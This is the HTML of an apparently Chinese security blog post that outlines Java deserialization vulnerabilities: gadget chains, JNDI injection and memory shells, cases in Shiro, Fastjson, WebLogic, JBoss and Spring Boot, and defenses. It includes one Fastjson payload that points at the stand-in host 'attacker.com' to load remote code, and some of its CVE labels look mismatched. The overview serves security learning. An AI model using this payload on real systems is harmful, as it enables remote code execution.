@@ -1,0 +1,319 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java 反序列化漏洞 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Java 反序列化漏洞目录 一、漏洞基础与前置知识 二、常见利用技术详解 三、主流利用链与工具分析 四、典型系统与框架中的反序列化利用 五、防护建议与检测手段   一、漏洞基础与前置知识1. Java 序列化与反序列化机制 ObjectOutputStream &#x2F; ObjectInputStream Serializable 接口 serialVersionUID  2. 反序列化漏洞的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 反序列化漏洞">
+<meta property="og:url" content="http://ruijiluo.github.io/2025/05/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="RJ の 博客">
+<meta property="og:description" content="Java 反序列化漏洞目录 一、漏洞基础与前置知识 二、常见利用技术详解 三、主流利用链与工具分析 四、典型系统与框架中的反序列化利用 五、防护建议与检测手段   一、漏洞基础与前置知识1. Java 序列化与反序列化机制 ObjectOutputStream &#x2F; ObjectInputStream Serializable 接口 serialVersionUID  2. 反序列化漏洞的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg">
+<meta property="article:published_time" content="2025-05-30T08:36:14.000Z">
+<meta property="article:modified_time" content="2026-04-27T04:44:14.952Z">
+<meta property="article:author" content="Rui Ji">
+<meta property="article:tag" content="Java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2025/05/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java 反序列化漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-04-27 12:44:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java 反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-30T08:36:14.000Z" title="发表于 2025-05-30 16:36:14">2025-05-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-27T04:44:14.952Z" title="更新于 2026-04-27 12:44:14">2026-04-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java 反序列化漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">一、漏洞基础与前置知识</a></li>
+<li><a href="#%E4%BA%8C%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3">二、常见利用技术详解</a></li>
+<li><a href="#%E4%B8%89%E4%B8%BB%E6%B5%81%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90">三、主流利用链与工具分析</a></li>
+<li><a href="#%E5%9B%9B%E5%85%B8%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8">四、典型系统与框架中的反序列化利用</a></li>
+<li><a href="#%E5%85%AD%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE%E4%B8%8E%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5">五、防护建议与检测手段</a></li>
+</ul>
+<hr>
+<h2 id="一、漏洞基础与前置知识"><a href="#一、漏洞基础与前置知识" class="headerlink" title="一、漏洞基础与前置知识"></a>一、漏洞基础与前置知识</h2><h3 id="1-Java-序列化与反序列化机制"><a href="#1-Java-序列化与反序列化机制" class="headerlink" title="1. Java 序列化与反序列化机制"></a>1. Java 序列化与反序列化机制</h3><ul>
+<li>ObjectOutputStream &#x2F; ObjectInputStream</li>
+<li>Serializable 接口</li>
+<li>serialVersionUID</li>
+</ul>
+<h3 id="2-反序列化漏洞的成因"><a href="#2-反序列化漏洞的成因" class="headerlink" title="2. 反序列化漏洞的成因"></a>2. 反序列化漏洞的成因</h3><ul>
+<li>不可信数据源传入反序列化入口</li>
+<li>黑盒与白盒场景对比</li>
+</ul>
+<h3 id="3-常见反序列化入口"><a href="#3-常见反序列化入口" class="headerlink" title="3. 常见反序列化入口"></a>3. 常见反序列化入口</h3><ul>
+<li><code>readObject()</code> &#x2F; <code>readValue()</code></li>
+<li><code>readResolve()</code> &#x2F; <code>writeReplace()</code></li>
+<li>JNDI &#x2F; RMI &#x2F; T3 &#x2F; HTTP 接口</li>
+</ul>
+<hr>
+<h2 id="二、常见利用技术详解"><a href="#二、常见利用技术详解" class="headerlink" title="二、常见利用技术详解"></a>二、常见利用技术详解</h2><h3 id="1-执行系统命令（RCE）"><a href="#1-执行系统命令（RCE）" class="headerlink" title="1. 执行系统命令（RCE）"></a>1. 执行系统命令（RCE）</h3><ul>
+<li>Runtime.exec &#x2F; ProcessBuilder 利用</li>
+<li>命令注入点识别</li>
+</ul>
+<h3 id="2-恶意类加载与内存执行"><a href="#2-恶意类加载与内存执行" class="headerlink" title="2. 恶意类加载与内存执行"></a>2. 恶意类加载与内存执行</h3><ul>
+<li>TemplatesImpl 字节码注入</li>
+<li>defineClass 动态加载类利用</li>
+</ul>
+<h3 id="3-JNDI-注入与远程类加载"><a href="#3-JNDI-注入与远程类加载" class="headerlink" title="3. JNDI 注入与远程类加载"></a>3. JNDI 注入与远程类加载</h3><ul>
+<li>LDAP &#x2F; RMI 利用流程</li>
+<li>无回连场景下如何利用</li>
+</ul>
+<h3 id="4-内存马注入"><a href="#4-内存马注入" class="headerlink" title="4. 内存马注入"></a>4. 内存马注入</h3><ul>
+<li>注册 Filter &#x2F; Servlet</li>
+<li>动态修改内存结构</li>
+</ul>
+<hr>
+<h2 id="三、主流利用链与工具分析"><a href="#三、主流利用链与工具分析" class="headerlink" title="三、主流利用链与工具分析"></a>三、主流利用链与工具分析</h2><h3 id="1-CommonsCollections-链分析（CC1-CC7）"><a href="#1-CommonsCollections-链分析（CC1-CC7）" class="headerlink" title="1. CommonsCollections 链分析（CC1~CC7）"></a>1. CommonsCollections 链分析（CC1~CC7）</h3><ul>
+<li>原理 &#x2F; 触发路径</li>
+<li>变体与使用方式</li>
+</ul>
+<h3 id="2-TemplatesImpl-链"><a href="#2-TemplatesImpl-链" class="headerlink" title="2. TemplatesImpl 链"></a>2. TemplatesImpl 链</h3><ul>
+<li>字节码拼接与注入执行</li>
+</ul>
+<h3 id="3-其他利用链简析"><a href="#3-其他利用链简析" class="headerlink" title="3. 其他利用链简析"></a>3. 其他利用链简析</h3><ul>
+<li>BeanShell &#x2F; Spring &#x2F; Hibernate</li>
+</ul>
+<h3 id="4-ysoserial-工具使用"><a href="#4-ysoserial-工具使用" class="headerlink" title="4. ysoserial 工具使用"></a>4. ysoserial 工具使用</h3><ul>
+<li>支持链 &#x2F; 参数用法</li>
+<li>自定义 Gadget 构造</li>
+</ul>
+<h3 id="5-Arthas工具使用"><a href="#5-Arthas工具使用" class="headerlink" title="5.Arthas工具使用"></a>5.Arthas工具使用</h3><hr>
+<h2 id="四、典型系统与框架中的反序列化利用"><a href="#四、典型系统与框架中的反序列化利用" class="headerlink" title="四、典型系统与框架中的反序列化利用"></a>四、典型系统与框架中的反序列化利用</h2><p>本章将介绍在实际攻击中被广泛利用的典型 Java 系统、框架和中间件中存在的反序列化漏洞及其利用方式。</p>
+<hr>
+<h3 id="1-Apache-Shiro"><a href="#1-Apache-Shiro" class="headerlink" title="1. Apache Shiro"></a>1. Apache Shiro</h3><ul>
+<li><strong>漏洞编号</strong>：CVE-2016-4437（Shiro721）</li>
+<li><strong>漏洞机制</strong>：<ul>
+<li>Shiro 使用 AES-CBC 加密 <code>rememberMe</code> Cookie；</li>
+<li>攻击者可通过 Padding Oracle 攻击猜解密钥；</li>
+<li>构造反序列化 payload 注入到 Cookie 中，触发命令执行。</li>
+</ul>
+</li>
+<li><strong>利用方式</strong>：<ol>
+<li>获取合法用户 Cookie；</li>
+<li>使用 Padding Oracle 工具逐字节构造合法密文；</li>
+<li>插入 CommonsCollections payload 触发反序列化；</li>
+</ol>
+</li>
+<li><strong>常用利用链</strong>：CommonsCollections1, 2, 6 等；</li>
+<li><strong>安全建议</strong>：<ul>
+<li>设置强随机密钥，定期更换；</li>
+<li>禁用 <code>rememberMe</code> 或启用白名单类反序列化。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="2-Fastjson"><a href="#2-Fastjson" class="headerlink" title="2. Fastjson"></a>2. Fastjson</h3><ul>
+<li><p><strong>常见漏洞</strong>：AutoType 任意类加载（如 CVE-2017-18318）</p>
+</li>
+<li><p><strong>漏洞机制</strong>：</p>
+<ul>
+<li>Fastjson 默认支持 <code>@type</code> 动态类加载；</li>
+<li>某些类（如 <code>JdbcRowSetImpl</code>）加载时会执行恶意代码；</li>
+<li>可搭配 LDAP、RMI 等 JNDI 服务实现远程命令执行。</li>
+</ul>
+</li>
+<li><p><strong>典型 payload</strong>：</p>
+<p>{<br>  “@type”: “com.sun.rowset.JdbcRowSetImpl”,<br>  “dataSourceName”: “ldap:&#x2F;&#x2F;attacker.com&#x2F;Exploit”,<br>  “autoCommit”: true<br>}</p>
+<p>影响版本：1.2.24 ~ 1.2.67 等多个版本；</p>
+<p>安全建议：</p>
+<p>升级至最新版；</p>
+<p>显式禁用 AutoType；</p>
+<p>配置白名单类。</p>
+</li>
+</ul>
+<h3 id="3-WebLogic常见漏洞："><a href="#3-WebLogic常见漏洞：" class="headerlink" title="3.WebLogic常见漏洞："></a>3.WebLogic常见漏洞：</h3><p>  T3 反序列化（CVE-2019-2725、CVE-2020-2551）；</p>
+<p>  XMLDecoder 任意代码执行；</p>
+<p>  JMXInvokerServlet 利用。</p>
+<p>  漏洞机制：</p>
+<p>  WebLogic 使用 T3 协议接收远程序列化对象；</p>
+<p>  无鉴权下可触发反序列化漏洞；</p>
+<p>  典型利用点：</p>
+<p>  T3 协议端口；</p>
+<p>  &#x2F;wls-wsat&#x2F;CoordinatorPortType；</p>
+<p>  安全建议：</p>
+<p>  禁用不必要端口和服务；</p>
+<p>  配置反序列化白名单；</p>
+<p>  更新官方补丁。</p>
+<h3 id="4-JBoss漏洞组件："><a href="#4-JBoss漏洞组件：" class="headerlink" title="4.JBoss漏洞组件："></a>4.JBoss漏洞组件：</h3><p>  JBossMQ；</p>
+<p>  JMXInvokerServlet；</p>
+<p>  InvokerTransformer Gadget；</p>
+<p>  漏洞机制：</p>
+<p>  JBoss 支持远程调用，通过反序列化处理请求；</p>
+<p>  早期版本未限制反序列化类；</p>
+<p>  常用利用链：</p>
+<p>  CommonsCollections、BeanShell、Groovy；</p>
+<p>  安全建议：</p>
+<p>  限制远程管理接口访问；</p>
+<p>  升级版本或使用 Red Hat 补丁；</p>
+<p>  关闭不必要模块。</p>
+<h3 id="5-Spring-Boot潜在风险："><a href="#5-Spring-Boot潜在风险：" class="headerlink" title="5.Spring Boot潜在风险："></a>5.Spring Boot潜在风险：</h3><p>  Jackson 或 Fastjson 用于请求参数解析；</p>
+<p>  自动绑定对象可能触发反序列化风险；</p>
+<p>  漏洞机制：</p>
+<p>  使用 @JsonTypeInfo(use &#x3D; Id.CLASS) 时允许动态类绑定；</p>
+<p>  请求中指定恶意类名可导致任意代码加载；</p>
+<p>  示例风险点：</p>
+<p>  直接接收 JSON 字符串映射任意类型；</p>
+<p>  SpringBoot Actuator 开启时某些端点可能暴露；</p>
+<p>  安全建议：</p>
+<p>  禁用 Jackson 动态类型解析；</p>
+<p>  绑定强类型对象；</p>
+<p>  限制管理接口访问。</p>
+<hr>
+<h2 id="五、防护建议与检测手段"><a href="#五、防护建议与检测手段" class="headerlink" title="五、防护建议与检测手段"></a>五、防护建议与检测手段</h2><h3 id="1-编码层防御"><a href="#1-编码层防御" class="headerlink" title="1. 编码层防御"></a>1. 编码层防御</h3><ul>
+<li>禁用 ObjectInputStream</li>
+<li>开启类白名单（JEP 290）</li>
+</ul>
+<h3 id="2-配置与权限防护"><a href="#2-配置与权限防护" class="headerlink" title="2. 配置与权限防护"></a>2. 配置与权限防护</h3><ul>
+<li>禁用 RMI &#x2F; T3 &#x2F; JNDI 加载</li>
+<li>使用安全组件替代反序列化</li>
+</ul>
+<h3 id="3-运行时与日志检测"><a href="#3-运行时与日志检测" class="headerlink" title="3. 运行时与日志检测"></a>3. 运行时与日志检测</h3><ul>
+<li>行为监控（EDR、HIDS）</li>
+<li>WebShell &#x2F; 内存马扫描</li>
+</ul>
+<h3 id="4-常用检测工具推荐"><a href="#4-常用检测工具推荐" class="headerlink" title="4. 常用检测工具推荐"></a>4. 常用检测工具推荐</h3><ul>
+<li><code>MemoryShell Scanner</code></li>
+<li><code>FindShiroKey</code></li>
+<li><code>jtool / javassist</code></li>
+</ul>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2025/05/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://ruijiluo.github.io/2025/05/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/05/30/Shiro-721%20Padding%20Oracle%E6%94%BB%E5%87%BB%E5%AE%8C%E6%95%B4%E7%AC%94%E8%AE%B0/" title="Shiro-721 Padding Oracle攻击完整笔记"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Shiro-721 Padding Oracle攻击完整笔记</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/30/%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E6%94%BB%E5%87%BB/" title="无文件落地攻击"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">无文件落地攻击</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Java 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">一、漏洞基础与前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-text">1. Java 序列化与反序列化机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-text">2. 反序列化漏洞的成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"><span class="toc-text">3. 常见反序列化入口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="toc-text">二、常见利用技术详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%88RCE%EF%BC%89"><span class="toc-text">1. 执行系统命令（RCE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%81%B6%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C"><span class="toc-text">2. 恶意类加载与内存执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-JNDI-%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">3. JNDI 注入与远程类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">4. 内存马注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%BB%E6%B5%81%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90"><span class="toc-text">三、主流利用链与工具分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CommonsCollections-%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1-CC7%EF%BC%89"><span class="toc-text">1. CommonsCollections 链分析（CC1~CC7）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-TemplatesImpl-%E9%93%BE"><span class="toc-text">2. TemplatesImpl 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%AE%80%E6%9E%90"><span class="toc-text">3. 其他利用链简析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ysoserial-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">4. ysoserial 工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Arthas%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">5.Arthas工具使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%85%B8%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">四、典型系统与框架中的反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Apache-Shiro"><span class="toc-text">1. Apache Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Fastjson"><span class="toc-text">2. Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-WebLogic%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">3.WebLogic常见漏洞：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-JBoss%E6%BC%8F%E6%B4%9E%E7%BB%84%E4%BB%B6%EF%BC%9A"><span class="toc-text">4.JBoss漏洞组件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Spring-Boot%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-text">5.Spring Boot潜在风险：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE%E4%B8%8E%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5"><span class="toc-text">五、防护建议与检测手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 